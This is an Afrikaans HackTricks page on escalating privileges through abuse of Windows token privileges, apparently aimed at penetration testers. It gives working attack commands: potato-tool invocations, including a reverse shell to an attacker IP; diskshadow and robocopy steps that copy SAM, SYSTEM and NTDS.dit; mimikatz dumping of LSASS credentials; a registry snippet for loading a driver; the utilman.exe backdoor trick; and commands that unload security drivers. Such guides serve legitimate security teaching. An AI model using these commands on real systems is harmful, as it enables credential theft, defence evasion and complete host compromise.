# Misbruik van Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

As jy **nie weet wat Windows Access Tokens is nie**, lees hierdie bladsy voordat jy voortgaan:


{{#ref}}
access-tokens.md
{{#endref}}

**Jy kan moontlik privileges eskaleer deur tokens wat jy reeds besit te misbruik.**

### SeImpersonatePrivilege

Hierdie privilege laat ’n proses toe om ’n token te impersonate (maar nie te skep nie) wanneer dit ’n handle na daardie token kan verkry. ’n Bevoorregte token kan van ’n Windows service (DCOM) verkry word deur dit te dwing om NTLM-authentication teen ’n exploit uit te voer, waarna die uitvoering van ’n proses met SYSTEM-privileges moontlik gemaak word.<sup>[[2]](#references)</sup> Hierdie primitive kan uitgebuit word met tools soos [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (wat vereis dat WinRM disabled is), [SweetPotato](https://github.com/CCob/SweetPotato), en [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Moderne operatornotas:

- **JuicyPotato is legacy**: op Windows 10 1809+/Server 2019+ verkies **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, of **PrintSpoofer**, afhangend van watter RPC/COM-surface steeds bereikbaar is.
- As jy ’n service wat as **`LOCAL SERVICE`** of **`NETWORK SERVICE`** loop, compromised het en `whoami /priv` ’n **filtered token** sonder `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` wys, herstel eers die account se **default privilege set** (byvoorbeeld met **FullPowers**) en probeer daarna weer die potato-familie.<sup>[[3]](#references)</sup>
- Sommige nuwer forks is meer operator-friendly as die oorspronklike tools. Byvoorbeeld, **SigmaPotato** voeg reflection/in-memory execution en moderne Windows compatibility by, terwyl **PrintNotifyPotato** die PrintNotify COM-service misbruik en dikwels nuttig is wanneer die klassieke Spooler-path disabled is.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Dit is baie soortgelyk aan **SeImpersonatePrivilege**; dit gebruik die **same method** om ’n bevoorregte token te verkry.\
Hierdie privilege laat jou toe om ’n **primary token** aan ’n nuwe/opgeskorte proses toe te wys. Met die bevoorregte impersonation token kan jy ’n primary token aflei (DuplicateTokenEx).\
Met die token kan jy ’n **new process** met `CreateProcessAsUser` skep, of ’n proses opgeskort skep en die **token** instel (in die algemeen kan jy nie die primary token van ’n lopende proses wysig nie).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

As hierdie token geaktiveer is, kan jy **KERB_S4U_LOGON** gebruik om ’n **impersonation token** vir enige ander gebruiker te verkry sonder om die credentials te ken, ’n **arbitrary group** (admins) by die token te voeg, die **integrity level** van die token op "**medium**" te stel, en hierdie token aan die **current thread** toe te wys (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Die stelsel word deur hierdie privilege veroorsaak om **all read access**-beheer aan enige lêer toe te staan (beperk tot leesbewerkings). Dit word gebruik om die **password hashes** van plaaslike **Administrator**-rekeninge uit die registry te lees, waarna tools soos "**psexec**" of "**wmiexec**" met die hash gebruik kan word (Pass-the-Hash technique). Hierdie technique misluk egter onder twee omstandighede: wanneer die Local Administrator-rekening gedeaktiveer is, of wanneer ’n policy ingestel is wat administrative rights verwyder van Local Administrators wat op afstand verbind.<sup>[[2]](#references)</sup>\
In die praktyk is die mees betroubare ingeboude workflow gewoonlik **VSS + `robocopy /b`**: skep/stel ’n shadow copy bloot, en kopieer dan `SAM`/`SYSTEM` of `NTDS.dit` in **backup mode**, wat die file ACLs omseil.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Jy kan hierdie **privilege abuse** met die volgende uitvoer:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- deur **IppSec** te volg in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Of soos verduidelik in die **escalating privileges with Backup Operators**-afdeling van:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Hierdie privilege verskaf toestemming vir **write access** tot enige stelsellêer, ongeag die lêer se Access Control List (ACL). Dit skep talle moontlikhede vir escalation, insluitend die vermoë om **services te modify**, DLL Hijacking uit te voer en **debuggers** via Image File Execution Options te stel, onder verskeie ander tegnieke.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege is ’n kragtige permission, veral nuttig wanneer ’n gebruiker die vermoë het om tokens te impersonate, maar ook wanneer SeImpersonatePrivilege nie beskikbaar is nie. Hierdie vermoë berus op die vermoë om ’n token te impersonate wat dieselfde gebruiker verteenwoordig en waarvan die integrity level nie dié van die huidige proses oorskry nie.<sup>[[2]](#references)</sup>

**Sleutelpunte:**

- **Impersonation sonder SeImpersonatePrivilege:** Dit is moontlik om SeCreateTokenPrivilege vir EoP te benut deur tokens onder spesifieke toestande te impersonate.
- **Toestande vir Token Impersonation:** Suksesvolle impersonation vereis dat die target token aan dieselfde gebruiker behoort en ’n integrity level het wat kleiner as of gelyk aan die integrity level van die proses wat die impersonation probeer, is.
- **Creation and Modification of Impersonation Tokens:** Gebruikers kan ’n impersonation token skep en dit verbeter deur ’n privileged group se SID (Security Identifier) by te voeg.

### SeLoadDriverPrivilege

Hierdie privilege laat ’n proses toe om **device drivers te load en unload** deur ’n registry entry met spesifieke `ImagePath`- en `Type`-waardes te skep. Omdat direkte write access tot `HKLM` (HKEY_LOCAL_MACHINE) beperk is, kan `HKCU` (HKEY_CURRENT_USER) eerder gebruik word. ’n Spesifieke path word egter vereis om die `HKCU`-entry deur die kernel as ’n driver configuration herkenbaar te maak.<sup>[[2]](#references)</sup>

Moderne offensive use is gewoonlik **BYOVD** (bring your own vulnerable driver): load ’n **signed but vulnerable** kernel driver en gebruik dan sy IOCTLs om protections te disable of na kernel code execution te spring. Hou in gedagte dat die **Microsoft vulnerable driver blocklist** en/of **HVCI/Memory Integrity** op onlangse Windows 11/Server builds dikwels ouer public chains breek, en dat die klassieke `szkg64.sys`-style voorbeelde dus nie meer universeel betroubaar is nie.

Hierdie path is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, waar `<RID>` die Relative Identifier van die huidige gebruiker is. Binne `HKCU` moet hierdie volledige path geskep word, en twee waardes moet gestel word:<sup>[[2]](#references)</sup>

- `ImagePath`, wat die path na die binary is wat uitgevoer moet word
- `Type`, met ’n waarde van `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Stappe om te volg:**

1. Kry toegang tot `HKCU` in plaas van `HKLM` weens beperkte write access.
2. Skep die path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` binne `HKCU`, waar `<RID>` die huidige gebruiker se Relative Identifier verteenwoordig.
3. Stel die `ImagePath` na die binary se execution path.
4. Ken `Type` toe as `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Meer maniere om hierdie privilege te abuse in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Dit is soortgelyk aan **SeRestorePrivilege**. Die primêre funksie daarvan laat ’n proses toe om **eienaarskap van ’n objek oor te neem**, en sodoende die vereiste vir eksplisiete diskresionêre toegang te omseil deur WRITE_OWNER-toegangsregte te verskaf. Die proses behels dat eienaarskap van die bedoelde registersleutel eers verkry word vir skryfdoeleindes, waarna die DACL verander word om skryfbewerkings moontlik te maak.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Hierdie privilege laat jou toe om **debug other processes**, insluitend om die memory te lees en te skryf. Verskeie strategieë vir memory injection, wat die meeste antivirus- en host intrusion prevention-oplossings kan omseil, kan met hierdie privilege gebruik word.<sup>[[2]](#references)</sup>

Op moderne Windows, onthou dat `SeDebugPrivilege` gewoonlik voldoende is om **non-protected SYSTEM processes** oop te maak en hul tokens te dupliseer, maar dit is **nie** ’n waarborg dat jy toegang tot **LSASS** kan verkry nie. As **RunAsPPL / LSA Protection** geaktiveer is, kan non-protected processes nie in LSASS lees of dit inject nie, selfs al is `SeDebugPrivilege` teenwoordig. In daardie geval, steel ’n token van ’n ander non-PPL SYSTEM process, of chain met ’n PPL bypass/BYOVD eerder as om aan te neem dat `procdump` sal werk. Vir ’n volledige token-copy voorbeeld wat `SeDebugPrivilege` + `SeImpersonatePrivilege` gebruik, kyk na [hierdie bladsy](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Jy kan [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) uit die [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) gebruik om **die memory van ’n process vas te lê**. Spesifiek kan dit op die **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** process toegepas word, wat verantwoordelik is vir die stoor van user credentials nadat ’n user suksesvol by ’n stelsel aangemeld het.

Jy kan hierdie dump dan in mimikatz laai om passwords te verkry:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

As jy 'n `NT SYSTEM`-shell wil kry, kan jy die volgende gebruik:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Hierdie reg (Perform volume maintenance tasks) laat toe dat rou volume device handles (bv. \\.\C:) oopgemaak word vir direkte disk-I/O wat NTFS ACLs omseil. Daarmee kan jy die bytes van enige lêer op die volume kopieer deur die onderliggende blokke te lees, wat arbitrêre lêerlees van sensitiewe materiaal moontlik maak (bv. masjien-private sleutels in %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS via VSS).<sup>[[5]](#references)</sup> Dit is veral impakvol op CA servers, waar die exfiltration van die CA private key dit moontlik maak om ’n Golden Certificate te forge om enige principal na te boots.<sup>[[6]](#references)</sup>

Sien gedetailleerde tegnieke en mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Kontroleer voorregte
```
whoami /priv
```
Die **tokens wat as Disabled verskyn**, kan gewoonlik geaktiveer word, dus kan jy dikwels beide _Enabled_ en _Disabled_ voorregte misbruik.

### Aktiveer alle tokens

As jy gedeaktiveerde voorregte het, kan jy die script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) gebruik om al die tokens te aktiveer:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Of die **script** wat in hierdie [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) ingebed is.

## Tabel

Volledige token privileges-cheatsheet by [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); die opsomming hieronder lys slegs direkte maniere om die privilege te exploit om ’n admin-sessie te verkry of sensitiewe lêers te lees.<sup>[[1]](#references)</sup>

| Privilege                  | Impak      | Tool                    | Uitvoeringspad                                                                                                                                                                                                                                                                                                                                     | Opmerkings                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Dit sal ’n gebruiker toelaat om tokens te impersonate en privesc na nt system te doen met tools soos potato.exe, rottenpotato.exe en juicypotato.exe"_                                                                                                                                                                                                      | Dankie aan [Aurélien Chalot](https://twitter.com/Defte_) vir die opdatering. Ek sal dit binnekort probeer herformuleer in iets meer soos ’n resep.                                                                                                                                                                                         |
| **`SeBackup`**             | **Bedreiging**  | _**Built-in commands**_ | Lees sensitiewe lêers met `robocopy /b` of toegewyde SeBackup-bewuste copy helpers.                                                                                                                                                                                                                                                                 | <p>- Uitstekend vir `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, en soms `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` is gerieflik, maar toegewyde SeBackup cmdlets/APIs is dikwels meer buigsaam vir geslote/oop lêers.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Skep ’n arbitrêre token, insluitend plaaslike admin-regte, met `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Dupliseer ’n **non-PPL** SYSTEM-token of dump geheue vanaf ’n nie-beskermde proses.                                                                                                                                                                                                                                                                 | <p>LSASS dumping word gewoonlik geblokkeer indien RunAsPPL/LSA Protection geaktiveer is.</p><p>Script is beskikbaar by [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Gebruik die **Potato family** / named-pipe impersonation om SYSTEM te spawn (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, ens.).                                                                                                                                                                                    | <p>Die mees praktiese opsie vanuit diensrekeninge soos IIS APPPOOL, MSSQL, scheduled tasks, of enige konteks wat reeds `SeImpersonatePrivilege` besit.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Laai ’n ondertekende-maar-kwesbare kernel driver (BYOVD)<br>2. Gebruik die driver se IOCTLs om kernel R/W te verkry, security tooling te deaktiveer, of na SYSTEM te elevate<br><br>Alternatiewelik kan die privilege gebruik word om security-related drivers te unload met die <code>fltMC</code> builtin command, byvoorbeeld <code>fltMC sysmondrv</code></p>                     | <p>Ouer publieke drivers soos <code>szkg64.sys</code> word toenemend op moderne Windows geblokkeer deur die vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Begin PowerShell/ISE met die SeRestore privilege teenwoordig.<br>2. Enable die privilege met <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rename utilman.exe na utilman.old<br>4. Rename cmd.exe na utilman.exe<br>5. Lock die console en druk Win+U</p> | <p>Attack kan deur sommige AV-sagteware opgespoor word.</p><p>’n Alternatiewe metode maak staat op die vervanging van service binaries wat in "Program Files" gestoor word, met dieselfde privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe na utilman.exe<br>4. Lock die console en druk Win+U</p>                                                                                                                                       | <p>Attack kan deur sommige AV-sagteware opgespoor word.</p><p>’n Alternatiewe metode maak staat op die vervanging van service binaries wat in "Program Files" gestoor word, met dieselfde privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipuleer tokens sodat plaaslike admin-regte ingesluit word. SeImpersonate mag vereis word.</p><p>Moet geverifieer word.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - exploit-paaie van Windows-privileges na admin](https://github.com/gtworek/Priv2Admin)
- [2] [Misbruik van Token Privileges vir LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Gee My My Privileges Terug! Asseblief?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Voer Robocopy uit (`/b` backup mode omseil file/folder ACL checks)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Voer volume maintenance tasks uit (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
